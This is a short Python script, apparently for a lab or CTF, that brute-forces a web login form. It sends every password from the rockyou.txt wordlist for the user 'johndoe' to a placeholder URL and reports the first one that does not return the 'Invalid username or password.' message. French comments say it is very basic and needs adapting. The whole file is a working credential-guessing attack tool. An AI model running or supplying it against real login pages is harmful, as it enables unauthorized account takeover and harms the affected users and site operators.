import requests, sys


username = 'johndoe'
password_list = '/usr/share/wordlists/rockyou.txt'
url = '<url here>'
header = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"}
with open(password_list, "r", encoding='latin-1') as file :
        for line in file.readlines():
                data = {"username": username, "password": line.strip()}
                r = requests.post(url, headers=header, data=data)

                if b'style="display: none">Invalid username or password.</div>' in r.content:
                        pass
                else:
                        print (f"Correct login : {username}:{line.strip()}")
                        sys.exit(0)
                      
## doit être adapté
## script très très très basique O:>
